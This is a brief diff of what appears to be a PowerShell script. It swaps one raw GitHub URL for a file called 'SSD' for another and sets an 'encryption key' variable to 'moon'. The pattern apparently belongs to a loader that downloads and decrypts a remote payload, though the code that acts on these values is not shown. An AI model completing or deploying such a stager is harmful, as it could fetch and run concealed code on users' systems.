@@ -1,4 +1,4 @@
-$u='https://raw.githubusercontent.com/CharonXCII/Cicada3301_75e535b0-0be0-4a38-ac55-f9754662a8af/refs/heads/main/SSD'
+$u='https://raw.githubusercontent.com/CharonXCII/short/refs/heads/main/SSD'
 
 try {
     $k = 'moon' //change encryption key 
